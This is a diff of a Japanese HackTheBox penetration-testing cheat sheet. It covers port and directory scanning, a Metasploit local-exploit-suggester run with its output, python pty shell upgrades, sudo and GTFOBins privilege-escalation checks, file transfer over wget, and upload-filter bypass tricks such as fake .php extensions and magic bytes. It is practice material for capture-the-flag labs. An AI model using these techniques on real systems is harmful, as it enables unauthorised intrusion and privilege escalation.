@@ -1,8 +1,8 @@
 # HackTheBox_CheatSheet
 
-## 段階別対応
-### 偵察(search) 
-#### 初めの一歩
+# 段階別対応
+## 偵察(search) 
+### 初めの一歩
 ターゲットをhostsに入れ、ポート確認とディレクトリ検索を実施
 ```
 TARGET=<IP>
@@ -11,8 +11,8 @@ rustscan -b 1000 ${TARGET} > rustscan.txt
 gobuster dir -e -u ${TARGET} --wildcard  -w /usr/share/wordlists/dirb/common.txt > gobuster.txt
 ```
 
-### (足がかり)Initial Footprint
-#### 実績ありポートとサービス(特別脆弱性を突いた例)
+## (足がかり)Initial Footprint
+### 実績ありポートとサービス(特別脆弱性を突いた例)
 21/tcp:ftp
 　接続して、適当なユーザで試す＋anonymousユーザ接続もあり　
 　接続成功後はリバースシェル等モジュールを送り込める
@@ -31,7 +31,7 @@ gobuster dir -e -u ${TARGET} --wildcard  -w /usr/share/wordlists/dirb/common.txt
 
 
 
-#### 着目すべきポート
+### 着目すべきポート
 80/tcp:http, 443/tcp:https
 　->Webサイトにある脆弱性を確認する
 
@@ -47,7 +47,7 @@ gobuster dir -e -u ${TARGET} --wildcard  -w /usr/share/wordlists/dirb/common.txt
 389, 636:LDAP
 　->ActiveDirectoryに関する脆弱性があるかも
  
-### その他ポート
+## その他ポート
 22/tcp:ssh OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0
 22/tcp open ssh OpenSSH 3.9p1 (protocol 1.99)
 23/tcp :telnet Linux telnetd
@@ -81,10 +81,10 @@ gobuster dir -e -u ${TARGET} --wildcard  -w /usr/share/wordlists/dirb/common.txt
 8080/tcp:http Apache Tomcat/Coyote JSP engine 1.1
 10000/tcp:http MiniServ 0.01 (Webmin httpd)
  
-#### Webの確認ポイント
+### Webの確認ポイント
 
-### (一般権限奪取)user level privilege
-#### フォルダ/ファイルあさり
+## (一般権限奪取)user level privilege
+### フォルダ/ファイルあさり
 権限昇格を狙って探索を行う　
 以下のファイルにOSの情報が記載されている
 ```
@@ -106,16 +106,71 @@ CentOS release 4.5 (Final)
 Server username: NT AUTHORITY\SYSTEM
 ```
 
-#### Webシェル/リバースシェル
-#### Meterpreterによるexploit確認
+### Webシェル/リバースシェル
+[リバースシェル置き場](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 
-### (特権昇格)privilege escalation
-#### 利用できるツール
-#### Kernel Exploit
+pythonを用いたシェルアップグレード
+```
+python -c 'import pty; pty.spawn("/bin/sh")'
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+ 
+### Meterpreterによるexploit確認
+セッションを残した状態で、実行
+```
+ msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
+msf5 post(multi/recon/local_exploit_suggester) > show options
 
-## ツール色々
-### ポート調査
-#### nmap
+Module options (post/multi/recon/local_exploit_suggester):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   SESSION                           yes       The session to run this module on
+   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
+
+msf5 post(multi/recon/local_exploit_suggester) > set session 1
+session => 1
+msf5 post(multi/recon/local_exploit_suggester) > run 
+
+[*] 10.10.10.5 - Collecting local exploits for x86/windows...
+[*] 10.10.10.5 - 30 exploit checks are being tried...
+[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[*] Post module execution completed
+msf5 post(multi/recon/local_exploit_suggester) >
+``` 
+ 
+## (特権昇格)privilege escalation
+### 脆弱性を確認する手段
+Linuxの場合、以下ツールを利用
+
+[LinEnum](https://github.com/rebootuser/LinEnum)　[詳細](#内部探査)
+
+Windowsの場合、以下ツールを利用
+　
+[Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)　[詳細](#内部探査)
+ 
+### Kernel Exploit
+以下コマンドでSUDO権限を確認
+```
+sudo -l
+```
+
+その後以下のサイトで検索し、SUDO実行時に権限昇格が行えるか確認
+[GTFOBins](https://gtfobins.github.io/)
+
+# ツール色々
+## ポート調査
+### nmap
 空いてるポート・サービス確認
 ```
 nmap -sC -sV -Pn XX.XX.XX.XX
@@ -131,53 +186,84 @@ UDPの確認
 nmap -sU -v <host>
 ```
 
-#### rustscan
+### rustscan
 nmapを高速化したもの、ポート特定までやってnmapに引き渡し
 ```
 rustscan -b 1000 10.10.10.197
 ```
 
-### Web探索
-#### nikto
+## Web探索
+### nikto
 webサービスについて、ディレクトリ探査や脆弱性を確認できる
 ```
 nikto -h XX.XX.XX.XX
 ```
 
-#### dirb
+### dirb
 webサービスについて、ディレクトリ探査が可能、ネストも調べてくれるが遅い
 ```
 dirb http://XX.XX.XX.XX
 ```
 
-#### gobuster
+### gobuster
 dirbと同様に、ディレクトリ総当たりだが1階層のみで早い
 ```
 gobuster dir -e -u http://10.10.10.197:8080/ --wildcard  -w /usr/share/wordlists/dirb/common.txt
 ```
 
-### サービス探索
-#### wpscan
+## 内部探査
+### LinEnum
+Linuxの内部探査をしてくれるツール
+特に着目すべき部分
+```
+LinEnum.sh
+```
+
+### Windows-Exploit-Suggester
+Windowsの内部探査をしてくれるツール
+特に着目すべき部分
+```
+sssss
+```
+
+## サービス探索
+### wpscan
 wordpressの内容把握に利用可能
 wordpressはそのもののバージョンから脆弱性を探したり、wp-content/plugin配下の脆弱なプラグインを探したりする
 ```
 wpscan --url <url> --enumerate p,u
 ```
 
-## 小技色々
-#### SMB匿名接続
+# 小技色々
+## SMB匿名接続
 ```
 kali@kali:~$ rpcclient -U "" lame.htb
 Enter WORKGROUP\'s password: 
 Cannot connect to server.  Error was NT_STATUS_IO_TIMEOUT
 ```
 
+## ファイルアップロード
+簡易サーバを立ち上げてwgetで受け取る
+```
+python -m SimpleHTTPServer
+----------------------------
+wget http://<IP>:8080/<fileName>
+```
 
+## PINGファイルをアップロードする方法色々
+色々ある
+```
+拡張子を偽装
+.ping.php
 
-## 知らないことリスト
+マジックバイトを仕込む
 
-## WriteUp
-### HackTheBox
+```
+
+# 知らないことリスト
+
+# WriteUp
+## HackTheBox
 [Legacy](https://syachineko.hatenablog.com/entry/2020/06/21/163536)
 
 [Lame](https://syachineko.hatenablog.com/entry/2020/06/16/231952)
